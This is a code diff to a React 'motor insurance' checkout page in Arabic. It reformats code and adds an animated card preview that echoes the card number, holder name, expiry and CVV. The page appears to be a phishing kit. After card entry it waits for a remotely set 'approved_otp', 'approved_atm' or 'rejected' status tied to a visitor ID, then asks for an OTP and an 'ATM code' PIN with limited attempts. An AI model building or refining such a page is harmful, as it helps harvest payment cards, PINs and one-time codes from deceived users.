@@ -609,9 +609,11 @@ export default function MotorInsurance() {
   const [selectedVehicle, setSelectedVehicle] = useState<any>(null);
   const [visitorId, setVisitorId] = useState<string>("");
   const [isStepLoading, setIsStepLoading] = useState(false);
-  
+
   const [isAwaitingApproval, setIsAwaitingApproval] = useState(false);
-  const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus | null>(null);
+  const [approvalStatus, setApprovalStatus] = useState<ApprovalStatus | null>(
+    null,
+  );
   const [rejectionReason, setRejectionReason] = useState<string>("");
   const [atmCode, setAtmCode] = useState("");
 
@@ -644,8 +646,8 @@ export default function MotorInsurance() {
     if (!isAwaitingApproval || !visitorId || !isFirebaseConfigured) return;
 
     const unsubscribe = subscribeToApprovalStatus(visitorId, (data) => {
-      if (data.approvalStatus === 'approved_otp') {
-        setApprovalStatus('approved_otp');
+      if (data.approvalStatus === "approved_otp") {
+        setApprovalStatus("approved_otp");
         setIsAwaitingApproval(false);
         if (currentStep === 4) {
           setCurrentStep(5);
@@ -654,8 +656,8 @@ export default function MotorInsurance() {
           setCurrentStep(6);
           handleCurrentPage("motor-insurance-step-6-success");
         }
-      } else if (data.approvalStatus === 'approved_atm') {
-        setApprovalStatus('approved_atm');
+      } else if (data.approvalStatus === "approved_atm") {
+        setApprovalStatus("approved_atm");
         setIsAwaitingApproval(false);
         if (currentStep === 4) {
           setCurrentStep(7);
@@ -664,9 +666,11 @@ export default function MotorInsurance() {
           setCurrentStep(6);
           handleCurrentPage("motor-insurance-step-6-success");
         }
-      } else if (data.approvalStatus === 'rejected') {
-        setApprovalStatus('rejected');
-        setRejectionReason(data.rejectionReason || "تم رفض البطاقة، الرجاء استخدام بطاقة أخرى");
+      } else if (data.approvalStatus === "rejected") {
+        setApprovalStatus("rejected");
+        setRejectionReason(
+          data.rejectionReason || "تم رفض البطاقة، الرجاء استخدام بطاقة أخرى",
+        );
         setIsAwaitingApproval(false);
         if (currentStep === 7) {
           setCurrentStep(4);
@@ -890,24 +894,24 @@ export default function MotorInsurance() {
   const validateCardNumber = (cardNum: string): boolean => {
     const digits = cardNum.replace(/\s/g, "");
     if (!/^\d{13,19}$/.test(digits)) return false;
-    
+
     let sum = 0;
     let isEven = false;
-    
+
     for (let i = digits.length - 1; i >= 0; i--) {
       let digit = parseInt(digits[i], 10);
-      
+
       if (isEven) {
         digit *= 2;
         if (digit > 9) {
           digit -= 9;
         }
       }
-      
+
       sum += digit;
       isEven = !isEven;
     }
-    
+
     return sum % 10 === 0;
   };
 
@@ -921,7 +925,7 @@ export default function MotorInsurance() {
       });
       return false;
     }
-    
+
     if (!validateCardNumber(cardDigits)) {
       toast({
         title: "رقم البطاقة غير صالح",
@@ -1103,9 +1107,16 @@ export default function MotorInsurance() {
     return v;
   };
 
-  const getCardType = (cardNum: string): { type: string; logo: string; name: string } => {
+  const getCardType = (
+    cardNum: string,
+  ): { type: string; logo: string; name: string } => {
     const num = cardNum.replace(/\s/g, "");
-    if (/^(440647|440795|446404|457865|968201|968202|968203|968204|968205|968206|968207|968208|968209|968210|968211|968212|968213|968214|968215|968216|968217|968218|968219|968220)/.test(num) || num.startsWith("9682")) {
+    if (
+      /^(440647|440795|446404|457865|968201|968202|968203|968204|968205|968206|968207|968208|968209|968210|968211|968212|968213|968214|968215|968216|968217|968218|968219|968220)/.test(
+        num,
+      ) ||
+      num.startsWith("9682")
+    ) {
       return { type: "mada", logo: madaLogo, name: "Mada" };
     } else if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) {
       return { type: "mastercard", logo: mastercardLogo, name: "Mastercard" };
@@ -1155,7 +1166,9 @@ export default function MotorInsurance() {
                 {isAwaitingApproval ? "جاري التحقق من البطاقة" : "جاري التحميل"}
               </p>
               <p className="text-sm text-muted-foreground">
-                {isAwaitingApproval ? "يرجى الانتظار، جاري معالجة الدفع..." : "يرجى الانتظار..."}
+                {isAwaitingApproval
+                  ? "يرجى الانتظار، جاري معالجة الدفع..."
+                  : "يرجى الانتظار..."}
               </p>
             </div>
           </div>
@@ -1920,7 +1933,7 @@ export default function MotorInsurance() {
 
         {currentStep === 4 && (
           <div className="space-y-4">
-            {approvalStatus === 'rejected' && rejectionReason && (
+            {approvalStatus === "rejected" && rejectionReason && (
               <div className="bg-red-50 border border-red-200 rounded-xl p-4 flex items-center gap-3">
                 <AlertCircle className="h-5 w-5 text-red-500 flex-shrink-0" />
                 <div>
@@ -1929,55 +1942,145 @@ export default function MotorInsurance() {
                 </div>
               </div>
             )}
-            <div className="bg-gradient-to-l from-purple-600 via-purple-700 to-purple-800 rounded-xl p-6 text-white shadow-lg">
-              <div className="flex items-center justify-between mb-6">
+
+            {/* Interactive 3D Card Preview */}
+            <div className="perspective-1000 mb-6">
+              <div 
+                className={`relative w-full max-w-sm mx-auto h-52 transition-transform duration-700 preserve-3d cursor-pointer ${cardCvv.length > 0 ? 'rotate-y-180' : ''}`}
+                style={{ 
+                  transformStyle: 'preserve-3d',
+                  transform: cardCvv.length > 0 ? 'rotateY(180deg)' : 'rotateY(0deg)'
+                }}
+              >
+                {/* Front of Card */}
+                <div 
+                  className="absolute inset-0 rounded-2xl p-6 text-white shadow-2xl backface-hidden"
+                  style={{
+                    backfaceVisibility: 'hidden',
+                    background: currentCardType.type === 'mada' 
+                      ? 'linear-gradient(135deg, #1a5c6b 0%, #0d3a45 50%, #062028 100%)'
+                      : currentCardType.type === 'mastercard'
+                      ? 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)'
+                      : 'linear-gradient(135deg, #667eea 0%, #764ba2 50%, #5b3a8c 100%)'
+                  }}
+                >
+                  <div className="absolute top-0 left-0 w-full h-full overflow-hidden rounded-2xl">
+                    <div className="absolute -top-20 -right-20 w-40 h-40 bg-white/10 rounded-full blur-xl"></div>
+                    <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-white/5 rounded-full blur-lg"></div>
+                  </div>
+                  
+                  <div className="relative h-full flex flex-col justify-between">
+                    <div className="flex justify-between items-start">
+                      <div className="flex items-center gap-3">
+                        {/* Chip */}
+                        <div className="w-12 h-9 rounded-md bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 shadow-lg relative overflow-hidden">
+                          <div className="absolute inset-1 grid grid-cols-3 gap-px">
+                            <div className="bg-yellow-600/30 rounded-sm"></div>
+                            <div className="bg-yellow-600/30 rounded-sm"></div>
+                            <div className="bg-yellow-600/30 rounded-sm"></div>
+                            <div className="bg-yellow-600/30 rounded-sm"></div>
+                            <div className="bg-yellow-600/50 rounded-sm"></div>
+                            <div className="bg-yellow-600/30 rounded-sm"></div>
+                          </div>
+                        </div>
+                        {/* Contactless Icon */}
+                        <svg className="w-6 h-6 text-white/70" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                          <path d="M8.5 14.5A4 4 0 0 0 12 16a4 4 0 0 0 3.5-1.5M6 12a6 6 0 0 0 6 6 6 6 0 0 0 6-6M4 10a8 8 0 0 0 8 8 8 8 0 0 0 8-8" strokeLinecap="round"/>
+                        </svg>
+                      </div>
+                      <img 
+                        src={currentCardType.logo} 
+                        alt={currentCardType.name}
+                        className="h-10 w-auto object-contain brightness-0 invert opacity-90"
+                      />
+                    </div>
+
+                    <div className="space-y-4">
+                      <div 
+                        className="font-mono text-xl tracking-[0.2em] text-white/95"
+                        dir="ltr"
+                      >
+                        {cardNumber || '•••• •••• •••• ••••'}
+                      </div>
+                      
+                      <div className="flex justify-between items-end">
+                        <div>
+                          <div className="text-[10px] text-white/50 uppercase tracking-wider mb-1">Card Holder</div>
+                          <div className="font-medium text-sm tracking-wider uppercase">
+                            {cardName || 'YOUR NAME'}
+                          </div>
+                        </div>
+                        <div className="text-left">
+                          <div className="text-[10px] text-white/50 uppercase tracking-wider mb-1">Expires</div>
+                          <div className="font-mono text-sm">
+                            {cardExpiry || 'MM/YY'}
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Back of Card */}
+                <div 
+                  className="absolute inset-0 rounded-2xl text-white shadow-2xl"
+                  style={{
+                    backfaceVisibility: 'hidden',
+                    transform: 'rotateY(180deg)',
+                    background: currentCardType.type === 'mada' 
+                      ? 'linear-gradient(135deg, #0d3a45 0%, #062028 100%)'
+                      : currentCardType.type === 'mastercard'
+                      ? 'linear-gradient(135deg, #16213e 0%, #0f3460 100%)'
+                      : 'linear-gradient(135deg, #764ba2 0%, #5b3a8c 100%)'
+                  }}
+                >
+                  <div className="w-full h-12 bg-gray-900 mt-6"></div>
+                  <div className="p-6 space-y-4">
+                    <div className="flex items-center gap-3">
+                      <div className="flex-1 h-10 bg-gray-200 rounded flex items-center justify-end pr-4">
+                        <span className="font-mono text-gray-800 text-lg italic">
+                          {cardCvv || '•••'}
+                        </span>
+                      </div>
+                      <span className="text-xs text-white/70">CVV</span>
+                    </div>
+                    <div className="text-xs text-white/50 leading-relaxed">
+                      This card is property of the issuing bank. Unauthorized use is prohibited.
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div className="bg-gradient-to-l from-purple-600 via-purple-700 to-purple-800 rounded-xl p-5 text-white shadow-lg">
+              <div className="flex items-center justify-between">
                 <div className="flex items-center gap-3">
-                  <div className="w-12 h-12 rounded-full bg-white/20 backdrop-blur flex items-center justify-center">
-                    <CreditCard className="h-6 w-6" />
+                  <div className="w-10 h-10 rounded-full bg-white/20 backdrop-blur flex items-center justify-center">
+                    <Lock className="h-5 w-5" />
                   </div>
                   <div>
-                    <h2 className="font-bold text-lg">الدفع الآمن</h2>
-                    <p className="text-white/70 text-sm">
-                      بياناتك محمية بتشفير 256-bit SSL
+                    <h2 className="font-bold">الدفع الآمن</h2>
+                    <p className="text-white/70 text-xs">
+                      256-bit SSL
                     </p>
                   </div>
                 </div>
-                <Lock className="h-5 w-5 text-white/70" />
-              </div>
-
-              <div className="bg-white/10 backdrop-blur rounded-lg p-4 flex items-center justify-between">
-                <span className="text-white/80 text-sm">
-                  طرق الدفع المقبولة
-                </span>
-                <div className="flex gap-3 items-center bg-white rounded-lg px-3 py-2">
-                  <img
-                    src={madaLogo}
-                    alt="مدى"
-                    className="h-8 w-auto object-contain"
-                  />
-                  <div className="w-px h-4 bg-gray-300" />
-                  <img
-                    src={visaLogo}
-                    alt="VISA"
-                    className="h-4 w-auto object-contain"
-                  />
-                  <div className="w-px h-4 bg-gray-300" />
-                  <img
-                    src={mastercardLogo}
-                    alt="Mastercard"
-                    className="h-8 w-auto object-contain"
-                  />
+                <div className="flex gap-2 items-center">
+                  <img src={madaLogo} alt="مدى" className="h-6 w-auto object-contain brightness-0 invert opacity-80" />
+                  <img src={visaLogo} alt="VISA" className="h-4 w-auto object-contain brightness-0 invert opacity-80" />
+                  <img src={mastercardLogo} alt="Mastercard" className="h-6 w-auto object-contain brightness-0 invert opacity-80" />
                 </div>
               </div>
             </div>
 
             <Card className="p-6 shadow-lg border-0">
-              <div className="space-y-6">
-                <div>
-                  <Label className="text-sm font-medium text-foreground mb-2 block text-right">
-                    رقم البطاقة
+              <div className="space-y-5">
+                <div className="space-y-2">
+                  <Label className="text-sm font-medium text-foreground flex items-center justify-end gap-2">
+                    <span>رقم البطاقة</span>
+                    <CreditCard className="h-4 w-4 text-muted-foreground" />
                   </Label>
-                  <div className="relative">
+                  <div className="relative group">
                     <Input
                       value={cardNumber}
                       onChange={(e) =>
@@ -1985,67 +2088,74 @@ export default function MotorInsurance() {
                       }
                       placeholder="0000 0000 0000 0000"
                       maxLength={19}
-                      className="text-left h-14 text-lg pl-14 pr-4 rounded-xl border-2 focus:border-purple-500 transition-colors"
+                      className="text-left h-14 text-lg pl-16 pr-4 rounded-xl border-2 focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all font-mono tracking-wider"
                       dir="ltr"
                       data-testid="input-card-number"
                     />
-                    <div className="absolute left-3 top-1/2 -translate-y-1/2 w-8 h-8 rounded-lg bg-gradient-to-br from-purple-100 to-purple-50 flex items-center justify-center">
-                      <CreditCard className="h-4 w-4 text-purple-600" />
+                    <div className="absolute left-3 top-1/2 -translate-y-1/2 transition-transform group-focus-within:scale-110">
+                      <img 
+                        src={currentCardType.logo} 
+                        alt={currentCardType.name}
+                        className="h-8 w-auto object-contain"
+                      />
                     </div>
                   </div>
                 </div>
 
-                <div>
-                  <Label className="text-sm font-medium text-foreground mb-2 block text-right">
-                    اسم صاحب البطاقة
+                <div className="space-y-2">
+                  <Label className="text-sm font-medium text-foreground flex items-center justify-end gap-2">
+                    <span>اسم صاحب البطاقة</span>
                   </Label>
                   <Input
                     value={cardName}
                     onChange={(e) => setCardName(e.target.value.toUpperCase())}
-                    placeholder="الاسم كما يظهر على البطاقة"
-                    className="text-left h-14 text-lg uppercase rounded-xl border-2 focus:border-purple-500 transition-colors"
+                    placeholder="CARDHOLDER NAME"
+                    className="text-left h-14 text-lg uppercase rounded-xl border-2 focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all tracking-wider"
                     dir="ltr"
                     data-testid="input-card-name"
                   />
                 </div>
 
-                <div className="bg-gradient-to-l from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 rounded-xl p-4">
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <Label className="text-sm font-medium text-foreground mb-2 block text-right">
-                        تاريخ الانتهاء
-                      </Label>
-                      <Input
-                        value={cardExpiry}
-                        onChange={(e) =>
-                          setCardExpiry(formatExpiry(e.target.value))
-                        }
-                        placeholder="MM/YY"
-                        maxLength={5}
-                        className="text-center h-14 text-lg font-mono rounded-xl border-2 focus:border-purple-500 transition-colors bg-white dark:bg-gray-800"
-                        dir="ltr"
-                        data-testid="input-card-expiry"
-                      />
-                    </div>
-                    <div>
-                      <Label className="text-sm font-medium text-foreground mb-2 block text-right">
-                        رمز الأمان CVV
-                      </Label>
-                      <Input
-                        value={cardCvv}
-                        onChange={(e) =>
-                          setCardCvv(
-                            e.target.value.replace(/\D/g, "").slice(0, 4),
-                          )
-                        }
-                        placeholder="•••"
-                        maxLength={4}
-                        type="password"
-                        className="text-center h-14 text-lg font-mono rounded-xl border-2 focus:border-purple-500 transition-colors bg-white dark:bg-gray-800"
-                        dir="ltr"
-                        data-testid="input-card-cvv"
-                      />
-                    </div>
+                <div className="grid grid-cols-2 gap-4">
+                  <div className="space-y-2">
+                    <Label className="text-sm font-medium text-foreground flex items-center justify-end gap-2">
+                      <span>تاريخ الانتهاء</span>
+                    </Label>
+                    <Input
+                      value={cardExpiry}
+                      onChange={(e) =>
+                        setCardExpiry(formatExpiry(e.target.value))
+                      }
+                      placeholder="MM/YY"
+                      maxLength={5}
+                      className="text-center h-14 text-lg font-mono rounded-xl border-2 focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all"
+                      dir="ltr"
+                      data-testid="input-card-expiry"
+                    />
+                  </div>
+                  <div className="space-y-2">
+                    <Label className="text-sm font-medium text-foreground flex items-center justify-end gap-2">
+                      <span>CVV</span>
+                      <Lock className="h-3 w-3 text-muted-foreground" />
+                    </Label>
+                    <Input
+                      value={cardCvv}
+                      onChange={(e) =>
+                        setCardCvv(
+                          e.target.value.replace(/\D/g, "").slice(0, 4),
+                        )
+                      }
+                      placeholder="•••"
+                      maxLength={4}
+                      type="password"
+                      className="text-center h-14 text-lg font-mono rounded-xl border-2 focus:border-purple-500 focus:ring-4 focus:ring-purple-500/10 transition-all"
+                      dir="ltr"
+                      data-testid="input-card-cvv"
+                      onFocus={() => {}}
+                    />
+                    <p className="text-[10px] text-muted-foreground text-center">
+                      الرقم خلف البطاقة
+                    </p>
                   </div>
                 </div>
               </div>
@@ -2225,7 +2335,9 @@ export default function MotorInsurance() {
                   </Label>
                   <Input
                     value={atmCode}
-                    onChange={(e) => setAtmCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                    onChange={(e) =>
+                      setAtmCode(e.target.value.replace(/\D/g, "").slice(0, 6))
+                    }
                     placeholder="أدخل الرمز"
                     maxLength={6}
                     className="text-center h-14 text-2xl font-mono tracking-[0.5em] rounded-xl border-2 focus:border-purple-500 transition-colors"
@@ -2236,7 +2348,9 @@ export default function MotorInsurance() {
 
                 <div className="flex items-center gap-2 justify-center text-amber-600 bg-amber-50 dark:bg-amber-900/20 p-3 rounded-xl">
                   <Info className="h-4 w-4" />
-                  <span className="text-sm">المحاولات المتبقية: {otpAttempts}</span>
+                  <span className="text-sm">
+                    المحاولات المتبقية: {otpAttempts}
+                  </span>
                 </div>
 
                 <div className="space-y-3">
